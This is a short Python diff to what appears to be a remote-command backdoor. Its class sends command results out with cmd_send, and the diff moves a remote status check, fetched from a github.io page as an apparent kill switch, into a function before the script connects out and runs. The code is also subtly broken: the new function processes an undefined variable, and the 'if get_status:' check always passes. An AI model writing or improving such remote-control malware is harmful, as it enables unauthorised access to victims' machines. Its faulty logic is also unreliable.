@@ -141,14 +141,18 @@ class MotherFucker():
 
             self.cmd_send(cmd_rslt)
 
+def get_status():
+    s = requests.get('https://poggerpussy.github.io').text
+    status = re.sub(r"<.*?>",'', status)
+    return status
 
-s = requests.get('https://poggerpussy.github.io').text
-status = re.sub(r"<.*?>",'', status)
+
 if __name__ == "__main__":
     try:
-        if status == "true":
+        if get_status:
             app = MotherFucker("127.0.0.1", "80")
             app.run()
         sleep(10)
-    except Exception:
+    except Exception as e:
+        print(e)
         pass
